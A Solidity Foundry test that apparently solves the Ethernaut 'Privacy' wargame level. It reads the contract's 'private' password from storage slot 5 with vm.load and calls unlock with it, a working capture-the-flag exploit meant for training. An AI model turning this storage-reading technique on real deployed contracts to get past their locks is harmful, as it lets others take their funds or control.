// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Privacy.sol";

contract PrivacyTest is Test {
    Privacy privacy = Privacy(vm.envAddress("PRIVACY"));

    function test() public {
        assertEq(privacy.locked(), true);
        bytes32 password = vm.load(address(privacy), bytes32(uint256(5)));

        console.logBytes16(bytes16(password));
        privacy.unlock(bytes16(password));
        assertEq(privacy.locked(), false);
    }
}
